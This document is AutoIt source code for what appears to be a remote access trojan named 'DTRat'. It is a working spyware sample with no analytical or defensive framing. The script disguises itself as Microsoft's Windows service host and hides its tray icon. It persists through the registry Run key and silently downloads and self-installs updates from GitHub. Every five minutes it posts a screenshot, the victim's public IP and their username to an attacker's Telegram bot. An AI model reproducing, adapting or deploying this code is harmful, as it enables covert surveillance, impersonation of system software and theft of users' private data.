#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile_x64=install.Exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_Comment=Host Process for Windows Services
#AutoIt3Wrapper_Res_Description=Host Process for Windows Services
#AutoIt3Wrapper_Res_Fileversion=6.1.7600.16385
#AutoIt3Wrapper_Res_LegalCopyright=© Microsoft Corporation. All rights reserved.
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <Inet.au3>
#include <ScreenCapture.au3>


Global Enum $STARTUP_RUN = 0, $STARTUP_RUNONCE, $STARTUP_RUNONCEEX

Func _StartupFolder_Exists($sName = @ScriptName, $bAllUsers = False)
	Local $sFilePath = Default
	__Startup_Format($sName, $sFilePath)
	Return FileExists(__StartupFolder_Location($bAllUsers) & '\' & $sName & '.lnk')
EndFunc   ;==>_StartupFolder_Exists

Func _StartupFolder_Install($sName = @ScriptName, $sFilePath = @ScriptFullPath, $sCommandline = '', $bAllUsers = False)
	Return __StartupFolder_Uninstall(True, $sName, $sFilePath, $sCommandline, $bAllUsers)
EndFunc   ;==>_StartupFolder_Install

Func _StartupFolder_Uninstall($sName = @ScriptName, $sFilePath = @ScriptFullPath, $bAllUsers = False)
	Return __StartupFolder_Uninstall(False, $sName, $sFilePath, Default, $bAllUsers)
EndFunc   ;==>_StartupFolder_Uninstall

Func _StartupRegistry_Exists($sName = @ScriptName, $bAllUsers = False, $iRunOnce = $STARTUP_RUN)
	Local $sFilePath = Default
	__Startup_Format($sName, $sFilePath)
	RegRead(__StartupRegistry_Location($bAllUsers, $iRunOnce) & '\', $sName)
	Return @error = 0
EndFunc   ;==>_StartupRegistry_Exists

Func _StartupRegistry_Install($sName = @ScriptName, $sFilePath = @ScriptFullPath, $sCommandline = '', $bAllUsers = False, $iRunOnce = $STARTUP_RUN)
	Return __StartupRegistry_Uninstall(True, $sName, $sFilePath, $sCommandline, $bAllUsers, $iRunOnce)
EndFunc   ;==>_StartupRegistry_Install

Func _StartupRegistry_Uninstall($sName = @ScriptName, $sFilePath = @ScriptFullPath, $bAllUsers = False, $iRunOnce = $STARTUP_RUN)
	Return __StartupRegistry_Uninstall(False, $sName, $sFilePath, Default, $bAllUsers, $iRunOnce)
EndFunc   ;==>_StartupRegistry_Uninstall

Func __Startup_Format(ByRef $sName, ByRef $sFilePath)
	If $sFilePath = Default Then
		$sFilePath = @ScriptFullPath
	EndIf
	If $sName = Default Then
		$sName = @ScriptName
	EndIf
	$sName = StringRegExpReplace($sName, '\.[^.\\/]*$', '') ; Remove extension.
	Return Not (StringStripWS($sName, $STR_STRIPALL) == '') And FileExists($sFilePath)
EndFunc   ;==>__Startup_Format

Func __StartupFolder_Location($bAllUsers)
	Return $bAllUsers ? @StartupCommonDir : @StartupDir
EndFunc   ;==>__StartupFolder_Location

Func __StartupFolder_Uninstall($bIsInstall, $sName, $sFilePath, $sCommandline, $bAllUsers)
	If Not __Startup_Format($sName, $sFilePath) Then
		Return SetError(1, 0, False) ; $STARTUP_ERROR_EXISTS
	EndIf
	If $bAllUsers = Default Then
		$bAllUsers = False
	EndIf
	If $sCommandline = Default Then
		$sCommandline = ''
	EndIf

	Local Const $sStartup = __StartupFolder_Location($bAllUsers)
	Local Const $hSearch = FileFindFirstFile($sStartup & '\' & '*.lnk')
	Local $vReturn = 0
	If $hSearch > -1 Then
		Local Const $iStringLen = StringLen($sName)
		Local $aFileGetShortcut = 0, _
				$sFileName = ''
		While 1
			$sFileName = FileFindNextFile($hSearch)
			If @error Then
				ExitLoop
			EndIf
			If StringLeft($sFileName, $iStringLen) = $sName Then
				$aFileGetShortcut = FileGetShortcut($sStartup & '\' & $sFileName)
				If @error Then
					ContinueLoop
				EndIf
				If $aFileGetShortcut[0] = $sFilePath Then
					$vReturn += FileDelete($sStartup & '\' & $sFileName)
				EndIf
			EndIf
		WEnd
		FileClose($hSearch)
	ElseIf Not $bIsInstall Then
		Return SetError(2, 0, False) ; $STARTUP_ERROR_EMPTY
	EndIf

	If $bIsInstall Then
		$vReturn = FileCreateShortcut($sFilePath, $sStartup & '\' & $sName & '.lnk', $sStartup, $sCommandline) > 0
	Else
		$vReturn = $vReturn > 0
	EndIf

	Return $vReturn
EndFunc   ;==>__StartupFolder_Uninstall

Func __StartupRegistry_Location($bAllUsers, $iRunOnce)
	If $iRunOnce = Default Then
		$iRunOnce = $STARTUP_RUN
	EndIf
	Local $sRunOnce = ''
	Switch $iRunOnce
		Case $STARTUP_RUNONCE
			$sRunOnce = 'Once'
		Case $STARTUP_RUNONCEEX
			$sRunOnce = 'OnceEx'
		Case Else
			$sRunOnce = ''
	EndSwitch

	Return ($bAllUsers ? 'HKEY_LOCAL_MACHINE' : 'HKEY_CURRENT_USER') & _
			((@OSArch = 'X64') ? '64' : '') & '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' & $sRunOnce
EndFunc   ;==>__StartupRegistry_Location

Func __StartupRegistry_Uninstall($bIsInstall, $sName, $sFilePath, $sCommandline, $bAllUsers, $iRunOnce)
	If Not __Startup_Format($sName, $sFilePath) Then
		Return SetError(1, 0, False) ; $STARTUP_ERROR_EXISTS
	EndIf
	If $bAllUsers = Default Then
		$bAllUsers = False
	EndIf
	If $sCommandline = Default Then
		$sCommandline = ''
	EndIf

	Local Const $sRegistryKey = __StartupRegistry_Location($bAllUsers, $iRunOnce)
	Local $iInstance = 1, _
			$sRegistryName = '', _
			$vReturn = 0
	While 1
		$sRegistryName = RegEnumVal($sRegistryKey & '\', $iInstance)
		If @error Then
			ExitLoop
		EndIf

		If ($sRegistryName = $sName) And StringInStr(RegRead($sRegistryKey & '\', $sRegistryName), $sFilePath, $STR_NOCASESENSEBASIC) Then
			$vReturn += RegDelete($sRegistryKey & '\', $sName)
		EndIf
		$iInstance += 1
	WEnd

	If $bIsInstall Then
		$vReturn = RegWrite($sRegistryKey & '\', $sName, 'REG_SZ', $sFilePath & ' ' & $sCommandline) > 0
	Else
		$vReturn = $vReturn > 0
	EndIf

	Return $vReturn
EndFunc   ;==>__StartupRegistry_Uninstall


While 1
InetGet("https://raw.githubusercontent.com/DTRat/DTRat-Win/master/version.ini", @TempDir&"\version.ini", 1)
$lversion=IniRead(@TempDir&"\version.ini","main","version","0.0.0.1")
$nversion=FileGetVersion(@ScriptFullPath)
If $nversion<$lversion Then
  InetGet("https://raw.githubusercontent.com/DTRat/DTRat-Win/blob/master/svchosts.exe", @TempDir&"\svchosts.exe", 1)
  _SelfUpdate(@TempDir & '\svchosts.exe', True, 30, False)
  FileDelete(@ScriptDir&"\old.exe")
EndIf

    $sPublicIP = _GetIP()
    $token=IniRead(@TempDir&"\version.ini","main","token","")
    $chatid=IniRead(@TempDir&"\version.ini","main","chatid","")
	$imagee=@TempDir&"\ehuehue.jpg"
	Local $hBmp
		_StartupRegistry_Install()
    $hBmp = _ScreenCapture_Capture("")
    _ScreenCapture_SaveImage($imagee, $hBmp)
ShellExecuteWait('curl.exe',' -s -X POST "https://api.telegram.org/bot' & $token & '/sendPhoto" -F chat_id=' & $chatid & ' -F photo="@'&$imagee&'" -F caption="'&$sPublicIP&' - '&@UserName,@TempDir,"",@SW_HIDE)
	FileDelete($imagee)
	Sleep(300000)
WEnd


Func _SelfUpdate($sUpdatePath, $fRestart = Default, $iDelay = 5, $fUsePID = Default, $fBackupPath = Default)
    If @Compiled = 0 Or FileExists($sUpdatePath) = 0 Then
        Return SetError(1, 0, 0)
    EndIf

    Local $sTempFileName = @ScriptName
    $sTempFileName = StringLeft($sTempFileName, StringInStr($sTempFileName, '.', $STR_NOCASESENSEBASIC, -1) - 1)

    Local Const $sScriptPath = @ScriptFullPath
    Local $sBackupPath = ''
    If $fBackupPath Or $fBackupPath = Default Then
        $sBackupPath = 'MOVE /Y ' & '"' & $sScriptPath & '"' & ' "' & @ScriptDir & '\' & $sTempFileName & '_Backup.exe' & '"' & @CRLF
    EndIf

    While FileExists(@TempDir & '\' & $sTempFileName & '.bat')
        $sTempFileName &= Chr(Random(65, 122, 1))
    WEnd
    $sTempFileName = @TempDir & '\' & $sTempFileName & '.bat'

    If $iDelay = Default Then
        $iDelay = 5
    EndIf

    Local $sDelay = ''
    $iDelay = Int($iDelay)
    If $iDelay > 0 Then
        $sDelay = 'IF %TIMER% GTR ' & $iDelay & ' GOTO DELETE'
    EndIf

    Local $sAppID = @ScriptName, $sImageName = 'IMAGENAME'
    If $fUsePID Then
        $sAppID = @AutoItPID
        $sImageName = 'PID'
    EndIf

    Local $sRestart = ''
    If $fRestart Then
        $sRestart = 'START "" "' & $sScriptPath & '"'
    EndIf

    Local Const $iInternalDelay = 2
    Local Const $sData = '@ECHO OFF' & @CRLF & 'SET TIMER=0' & @CRLF _
             & ':START' & @CRLF _
             & 'PING -n ' & $iInternalDelay & ' 127.0.0.1 > nul' & @CRLF _
             & $sDelay & @CRLF _
             & 'SET /A TIMER+=1' & @CRLF _
             & @CRLF _
             & 'TASKLIST /NH /FI "' & $sImageName & ' EQ ' & $sAppID & '" | FIND /I "' & $sAppID & '" >nul && GOTO START' & @CRLF _
             & 'GOTO MOVE' & @CRLF _
             & @CRLF _
             & ':MOVE' & @CRLF _
             & 'TASKKILL /F /FI "' & $sImageName & ' EQ ' & $sAppID & '"' & @CRLF _
             & $sBackupPath & _
            'GOTO END' & @CRLF _
             & @CRLF _
             & ':END' & @CRLF _
             & 'MOVE /Y ' & '"' & $sUpdatePath & '"' & ' "' & $sScriptPath & '"' & @CRLF _
             & $sRestart & @CRLF _
             & 'DEL "' & $sTempFileName & '"'

    Local Const $hFileOpen = FileOpen($sTempFileName, $FO_OVERWRITE)
    If $hFileOpen = -1 Then
        Return SetError(2, 0, 0)
    EndIf
    FileWrite($hFileOpen, $sData)
    FileClose($hFileOpen)
    Return Run($sTempFileName, @TempDir, @SW_HIDE)
EndFunc   ;==>_SelfUpdate#cs ----------------------------------------------------------------------------